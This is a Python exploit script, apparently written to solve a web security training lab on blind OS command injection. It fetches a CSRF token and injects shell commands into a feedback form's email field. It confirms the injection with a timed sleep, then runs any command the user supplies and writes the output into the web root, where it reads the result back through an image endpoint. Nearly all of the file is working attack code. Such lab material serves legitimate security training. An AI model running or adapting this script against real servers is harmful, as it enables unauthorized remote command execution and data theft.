# Blind OS command injection with output redirection

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token: %s' % csrf)
	return csrf

def run_command(s, url, cmd):
	submit_path = '/feedback/submit'
	feedback_path = url + '/feedback'
	command_injection = " & %s #" % cmd
	print("[+] Extracting CSRF Token from the feedback page...")
	r = s.get(feedback_path)
	csrf_token = get_csrf_token(r)
	params = {'email': 'test@test.com' + command_injection, 'name': 'gwyo', 'subject': 'hacked', 'message': 'H4ck3d!!!', 'csrf': csrf_token}
	print(f"\n[+] Sending post request on {submit_path}:\n\t{params}\n")
	print(f"[+] Trying to run command '{command_injection}' on the target website...\n")
	res = s.post(url + submit_path, data=params)
	print(res)
	return res

def run_sleep(s, url):
	cmd = 'sleep 4'
	res = run_command(s, url, cmd)
	if (res.elapsed.total_seconds()) >= 4:
		print("[+] %s is vulnerable to Command Injection via the EMAIL field!\n" % url)
	else:
		print("[-] Command Injection Failed !!!")
		exit(1)

def run_write_file(s, url, command):
	output_file = '/var/www/images/output.txt'
	cmd = command + ' > ' + output_file
	res = run_command(s, url, cmd)
	if res.status_code == 200 and len(res.text) == 2:
		print("[+] File '%s' wrote successfully !\n" % output_file)
	else:
		print("[-] Writing File Failed !!!")
		exit(1)

def run_read_file(s, url):
	image_path = '/image?filename=output.txt'
	res = s.get(url + image_path)
	if res.status_code == 200:
		print("[+] Command Injection Successful !\n")
		print("[+] Command Output:")
		print("------------------------------------------\n")
		print("%s" % res.text)
		print("------------------------------------------")

	else:
		print("[-] Reading File Failed !!!")
		exit(1)

def show_usage():
	print('[+] Usage: %s <URL> <COMMAND>' % sys.argv[0])
	print("[+] Example: %s www.example.com id" % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################


def main():
	print('[+] Lab: Blind OS command injection with output redirection')
	try:
		url = sys.argv[1].strip()
		command = sys.argv[2].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying OS Command Injection to cause a delay of 10 secs...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			print("[+] Checking if email parameter is vulnerable to Blind Command Injection...")
			run_sleep(s, url)
			run_write_file(s, url, command)
			run_read_file(s, url)
			time.sleep(2)
			r = s.get(url)
			print(r)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
